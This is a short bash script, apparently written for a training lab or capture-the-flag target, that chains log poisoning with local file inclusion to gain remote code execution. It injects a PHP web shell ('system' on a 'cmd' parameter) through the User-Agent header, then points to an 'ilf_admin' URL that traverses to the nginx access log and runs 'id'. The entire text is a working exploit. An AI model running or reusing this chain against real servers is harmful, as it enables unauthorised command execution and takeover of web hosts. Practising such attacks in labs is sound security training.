#!/bin/bash
HOST="94.237.59.185:43870"
PAYLOAD="<?php system(\$_GET['cmd']); ?>"
curl -vvv -s "http://$HOST/index.php" -A "$PAYLOAD"
echo "Now visit http://$HOST/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id"
